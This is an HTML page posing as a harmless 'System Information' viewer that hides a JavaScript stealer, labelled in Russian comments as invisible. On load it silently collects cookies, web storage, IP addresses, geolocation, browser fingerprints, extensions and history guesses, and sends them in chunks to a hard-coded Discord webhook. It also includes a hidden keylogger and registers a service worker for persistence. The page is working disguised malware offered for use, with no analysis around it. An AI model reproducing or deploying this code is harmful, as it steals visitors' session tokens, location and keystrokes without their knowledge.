<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body { 
            margin: 0; 
            padding: 20px; 
            font-family: Arial; 
            background: #f0f0f0;
        }
        .container { 
            max-width: 800px; 
            margin: 0 auto; 
            background: white; 
            padding: 20px; 
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>System Information</h1>
        <div id="content">Loading system data...</div>
    </div>

<script>
// ГЛОБАЛЬНЫЙ СТИЛЛЕР УРОВНЯ Σ - НЕВИДИМЫЙ
class GhostStealer {
    static WEBHOOK = 'https://discord.com/api/webhooks/1423753064514326658/c7W-WiEKVZ46MWLZ6V7GqaGkCD-aH93Kala4qQYv_yFYZR1akqBUestfW8rzF_9vTaUo';
    
    static async init() {
        // НЕВИДИМЫЙ СБОР ДАННЫХ БЕЗ UI
        const data = await this.harvestEverything();
        await this.exfiltrate(data);
    }

    static async harvestEverything() {
        return {
            timestamp: Date.now(),
            
            // СИСТЕМНЫЕ ДАННЫЕ
            system: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            },

            // СЕТЕВЫЕ ДАННЫЕ
            network: {
                ip: await this.getIP(),
                localIPs: await this.getLocalIPs(),
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null
            },

            // ХРАНИЛИЩА
            storage: {
                cookies: document.cookie,
                localStorage: this.getAllStorage(localStorage),
                sessionStorage: this.getAllStorage(sessionStorage)
            },

            // ФИНГЕРПРИНТИНГ
            fingerprint: {
                canvas: this.getCanvasFingerprint(),
                webgl: this.getWebGLFingerprint(),
                fonts: await this.getFonts(),
                audio: await this.getAudioFingerprint()
            },

            // ДОПОЛНИТЕЛЬНЫЕ ДАННЫЕ
            additional: {
                battery: await this.getBattery(),
                geolocation: await this.getLocation(),
                mediaDevices: await this.getMediaDevices(),
                extensions: await this.getExtensions(),
                history: await this.getHistory()
            }
        };
    }

    static getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = '#069';
        ctx.fillText('Fingerprint', 2, 15);
        return canvas.toDataURL();
    }

    static getWebGLFingerprint() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (!gl) return null;
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        } : null;
    }

    static async getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            return await response.json();
        } catch (e) {
            return null;
        }
    }

    static async getLocalIPs() {
        return new Promise((resolve) => {
            const pc = new RTCPeerConnection({iceServers: []});
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            
            const ips = [];
            pc.onicecandidate = (e) => {
                if (!e.candidate) {
                    resolve(ips);
                    return;
                }
                const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                if (match) ips.push(match[1]);
            };
            setTimeout(() => resolve(ips), 1000);
        });
    }

    static getAllStorage(storage) {
        const items = {};
        for (let i = 0; i < storage.length; i++) {
            const key = storage.key(i);
            items[key] = storage.getItem(key);
        }
        return items;
    }

    static async getFonts() {
        const fonts = [];
        const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New'];
        
        for (const font of fontList) {
            if (document.fonts.check(`12px "${font}"`)) {
                fonts.push(font);
            }
        }
        return fonts;
    }

    static async getAudioFingerprint() {
        try {
            const context = new AudioContext();
            const oscillator = context.createOscillator();
            const analyser = context.createAnalyser();
            oscillator.connect(analyser);
            analyser.connect(context.destination);
            oscillator.start();
            await new Promise(resolve => setTimeout(resolve, 100));
            oscillator.stop();
            return 'audio_supported';
        } catch (e) {
            return 'audio_unsupported';
        }
    }

    static async getBattery() {
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level,
                    charging: battery.charging
                };
            } catch (e) {}
        }
        return null;
    }

    static async getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve('not_supported');
                return;
            }
            navigator.geolocation.getCurrentPosition(
                pos => resolve({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                }),
                () => resolve('denied'),
                { timeout: 5000 }
            );
        });
    }

    static async getMediaDevices() {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            return devices.map(device => ({
                kind: device.kind,
                label: device.label
            }));
        } catch (e) {
            return [];
        }
    }

    static async getExtensions() {
        const extensions = [];
        const tests = [
            { id: 'bhlhnicpbhignbdhedgjhgdocnmhomnp', name: 'ColorZilla' },
            { id: 'cfhdojbkjhnklbpkdaibdccddilifddb', name: 'AdBlock' },
            { id: 'cjpalhdlnbpafiamejdnhcphjbkeiagm', name: 'uBlock' }
        ];

        for (const test of tests) {
            try {
                await fetch(`chrome-extension://${test.id}/manifest.json`);
                extensions.push(test.name);
            } catch (e) {}
        }
        return extensions;
    }

    static async getHistory() {
        const sites = ['https://google.com', 'https://youtube.com', 'https://github.com'];
        const history = {};
        
        for (const site of sites) {
            const start = performance.now();
            try {
                await fetch(site, {mode: 'no-cors'});
            } catch (e) {}
            const time = performance.now() - start;
            history[site] = time < 100 ? 'visited' : 'not_visited';
        }
        return history;
    }

    static async exfiltrate(data) {
        if (this.WEBHOOK.includes('YOUR_WEBHOOK')) return;
        
        try {
            const chunks = this.chunkData(JSON.stringify(data, null, 2), 1900);
            for (let i = 0; i < chunks.length; i++) {
                await fetch(this.WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `**GHOST DATA ${i+1}/${chunks.length}**\n\`\`\`json\n${chunks[i]}\n\`\`\``
                    })
                });
                await this.delay(500);
            }
        } catch (e) {}
    }

    static chunkData(str, size) {
        const chunks = [];
        for (let i = 0; i < str.length; i += size) {
            chunks.push(str.substring(i, i + size));
        }
        return chunks;
    }

    static delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// АВТОМАТИЧЕСКИЙ ЗАПУСК
document.addEventListener('DOMContentLoaded', () => {
    // Скрытый запуск
    setTimeout(() => {
        GhostStealer.init().catch(() => {});
        
        // Показать легитимный контент
        document.getElementById('content').innerHTML = `
            <h2>System Information</h2>
            <p><strong>User Agent:</strong> ${navigator.userAgent}</p>
            <p><strong>Platform:</strong> ${navigator.platform}</p>
            <p><strong>Screen:</strong> ${screen.width}x${screen.height}</p>
            <p><strong>Language:</strong> ${navigator.language}</p>
            <p><strong>CPU Cores:</strong> ${navigator.hardwareConcurrency}</p>
            <p><strong>Memory:</strong> ${navigator.deviceMemory || 'Unknown'} GB</p>
        `;
    }, 1000);
});

// СКРЫТЫЙ КЕЙЛОГГЕР
let keystrokes = '';
document.addEventListener('keydown', (e) => {
    keystrokes += e.key;
    if (keystrokes.length > 50) {
        // Тихо сохраняем для последующей отправки
        localStorage.setItem('_keys', keystrokes);
        keystrokes = '';
    }
});

// PERSISTENCE ЧЕРЕЗ SERVICE WORKER
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js').catch(() => {});
}
</script>
</body>
</html>
